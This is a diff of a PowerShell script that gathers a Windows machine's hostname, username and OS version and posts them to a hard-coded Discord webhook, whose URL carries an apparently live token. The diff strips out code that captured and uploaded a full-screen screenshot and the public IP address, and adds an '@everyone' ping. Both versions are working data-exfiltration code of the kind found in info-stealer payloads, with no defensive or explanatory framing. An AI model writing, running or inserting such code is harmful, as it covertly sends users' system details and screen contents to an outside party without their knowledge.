@@ -1,49 +1,27 @@
 $webhookUrl = "https://discord.com/api/webhooks/1324111050462990409/2W_0PApeT1jCSsIdg5wAM2z2gmvgTYbDEugbL6qhgRTLosR7QWzlHAtxck0XrkrNFDI2"
-Function Get-Screenshot {
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-
-    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-
-    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
-
-    $screenshotPath = "$env:TEMP\\screenshot.png"
-    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
-
-    $graphics.Dispose()
-    $bitmap.Dispose()
-
-    return $screenshotPath
-}
 Function Get-SystemInfo {
     $hostname = $env:COMPUTERNAME
     $username = $env:USERNAME
     $os = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
-    $ipAddress = (Test-Connection -ComputerName google.com -Count 1).IPV4Address.IPAddressToString
 
     return @{
         Hostname  = $hostname
         Username  = $username
         OS        = $os
-        IPAddress = $ipAddress
     }
 }
 
-$screenshotPath = Get-Screenshot
 $systemInfo = Get-SystemInfo
 
 $jsonPayload = @{
-    content = "System Information and Screenshot"
+    content = "@everyone System Information and Screenshot"
     embeds = @(
         @{
             title = "System Information"
             fields = @(
                 @{name = "Hostname"; value = $systemInfo.Hostname; inline = $true},
                 @{name = "Username"; value = $systemInfo.Username; inline = $true},
-                @{name = "OS"; value = $systemInfo.OS; inline = $false},
-                @{name = "IP Address"; value = $systemInfo.IPAddress; inline = $false}
+                @{name = "OS"; value = $systemInfo.OS; inline = $false}
             )
         }
     )
@@ -57,11 +35,4 @@ $multipartContent = [System.Net.Http.MultipartFormDataContent]::new()
 $jsonContent = [System.Net.Http.StringContent]::new($jsonPayload, [System.Text.Encoding]::UTF8, "application/json")
 $multipartContent.Add($jsonContent, "payload_json")
 
-$fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
-$fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
-$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
-$multipartContent.Add($fileContent, "file", "screenshot.png")
-
-$response = $httpClient.PostAsync($webhookUrl, $multipartContent).Result
-$responseContent = $response.Content.ReadAsStringAsync().Result
-Remove-Item -Path $screenshotPath
+$httpClient.PostAsync($webhookUrl, $multipartContent).Result
